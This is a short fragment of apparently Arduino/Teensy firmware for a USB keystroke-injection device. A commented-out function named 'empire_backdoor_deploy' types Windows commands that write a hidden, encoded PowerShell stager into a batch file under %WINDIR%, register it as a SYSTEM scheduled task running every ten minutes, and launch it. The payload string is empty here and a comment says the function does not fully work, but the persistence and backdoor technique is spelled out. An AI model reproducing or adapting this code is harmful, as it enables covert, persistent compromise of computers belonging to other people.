...
// Not working 100% and takes up loads of memory...
/*
void empire_backdoor_deploy(void)
{
  blink_fast(3,80);
  Keyboard.print(F("@echo off > %WINDIR%\\winL.bat"));
  delay(700);
  Keyboard.print(F("start /b powershell.exe -NoP -sta -NonI -W Hidden -Enc >> %WINDIR%\\winL.bat"));
  delay(700);
  Keyboard.print("");
    //Keyboard.set_key1(KEY_ENTER);
    //Keyboard.send_now();
  delay(1000);
  Keyboard.print(F(" >> %WINDIR%\\winL.bat"));
  delay(700);
  Keyboard.println(F(""));
  Keyboard.println(F("schtasks /create /ru SYSTEM /sc MINUTE /MO 10 /tn WinL /tr \"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File %WINDIR%\\winL.bat\""));
  delay(300);
  Keyboard.println(F("schtasks /run /tn WinL"));
}
*/
...
// if (!digitalRead(p1)) { Serial.println("Switch 1 is on");}
